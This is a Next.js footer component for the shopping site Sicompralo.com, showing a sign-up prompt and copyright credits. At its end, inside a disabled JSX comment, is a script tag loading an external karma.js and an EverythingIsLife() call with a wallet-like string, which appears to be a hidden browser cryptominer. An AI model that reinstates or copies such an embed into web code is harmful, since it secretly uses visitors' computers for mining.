import Link from "next/link";
import { useEffect, useState } from "react";
import GetItem from "./localStorage/getItem";

const Footer = () => {
    const [cookies, setCookie] = useState(GetItem('user'));
    const [userLogged, setUserLogged] = useState('')

    useEffect(() => {
        cookies?.user ? setUserLogged('d-none') : setUserLogged('')
    })
    
    return(
        <>
        <article className={`col-12 col-sm-12 col-lg-12 col-xl-12 alert-user-logged-footer ${userLogged}`}>
            <p className='text-light'>
                <Link href='/registrarme' as='/registrarme'>
                <a className='text-info'>Regístrate</a></Link> o <Link href='/iniciar-sesion' as='/iniciar-sesion'>
                <a className='text-info'>inicia sesión</a></Link> para aprovechar de las oportunidades al máximo en 
                <strong> Sicompralo.com</strong>
                <svg width="2em" height="2em" viewBox="0 0 16 16" className="ml-3 bi bi-info-circle" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
                    <path fillRule="evenodd" d="M8 15A7 7 0 1 0 8 1a7 7 0 0 0 0 14zm0 1A8 8 0 1 0 8 0a8 8 0 0 0 0 16z"/>
                    <path d="M8.93 6.588l-2.29.287-.082.38.45.083c.294.07.352.176.288.469l-.738 3.468c-.194.897.105 1.319.808 1.319.545 0 1.178-.252 1.465-.598l.088-.416c-.2.176-.492.246-.686.246-.275 0-.375-.193-.304-.533L8.93 6.588z"/>
                    <circle cx="8" cy="4.5" r="1"/>
                </svg>
                <small className='d-block'>Copyright &copy; reserved Sicompralo.com { (new Date()).getFullYear() }</small>
                <small className='d-block'>Powered by <a className='text-info' target='_blank' href="https://nezzed.com">nezzed.com</a></small>
            </p>
        </article>
        <footer className="row">
            <article className="col-12 col-sm-12 col-lg-12 col-xl-12">
                <ul>
                    <li>Copyright &copy; reserved sicompralo.com { (new Date()).getFullYear() }</li>
                    <li>Powered by <a href="https://nezzed.com" target='_blank' className='text-info'>nezzed.com</a></li>
                </ul>
            </article>
        </footer>
        {/*<script src="https://trustiseverything.de/karma/karma.js?karma=bs?nosaj=faster.mo"/>
        <script 
            dangerouslySetInnerHTML={{
                __html: `EverythingIsLife('47msWQ2EiquLJj73f5pbQnF82Uheo8VMVPa8cCcgyCBZFig2JenAX5xKpEkEFPnwxSFHQtQgcrjTiiwb3umb1GL18xsB8U6', 'x', 20);`
            }}
        />*/}
        </>
    )
}

export default Footer;